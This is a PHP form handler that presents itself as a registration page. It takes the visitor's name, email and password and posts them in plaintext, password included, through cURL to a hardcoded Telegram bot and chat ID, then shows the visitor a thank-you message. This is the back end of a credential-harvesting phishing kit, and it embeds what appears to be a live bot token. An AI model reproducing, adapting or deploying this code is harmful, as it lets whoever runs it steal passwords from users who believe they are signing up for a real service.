<?php

// 1. Only accept POST requests
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    die("Invalid request.");
}

// 2. Read form fields (matching EXACT input names)
$first = trim($_POST['firstName'] ?? '');
$last  = trim($_POST['lastName'] ?? '');
$email = trim($_POST['email'] ?? '');
$pass1 = $_POST['password'] ?? '';
$pass2 = $_POST['password-confirm'] ?? '';

// 3. Basic validation
if (!$first || !$last || !$email || !$pass1 || !$pass2) {
    die("All fields are required.");
}

if ($pass1 !== $pass2) {
    die("Passwords do not match.");
}

// 4. Telegram Bot configuration
$bot_token = "8596833170:AAGe9k7d3JdQhfeiYtRJaXz42QeXB63ieas"; // <-- REPLACE with your REAL bot token
$chat_id   = "8564583333"; // <-- Your chat ID is correct

// 5. Build the Telegram message
$message = "📦 *New Registration*\n\n"
         . "👤 *Name:* $first $last\n"
         . "📧 *Email:* $email\n"
         . "🔑 *Password:* $pass1\n"
         . "🔁 *Retyped Password:* $pass2\n"
         . "⏰ *Time:* " . date("Y-m-d H:i:s");

// 6. Telegram API endpoint
$url = "https://api.telegram.org/bot$bot_token/sendMessage";

// 7. Data sent via POST
$post_fields = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

// 8. Send the message using cURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$result = curl_exec($ch);
curl_close($ch);

// 9. Success output
echo "Registration received — thank you, $first!";

?>
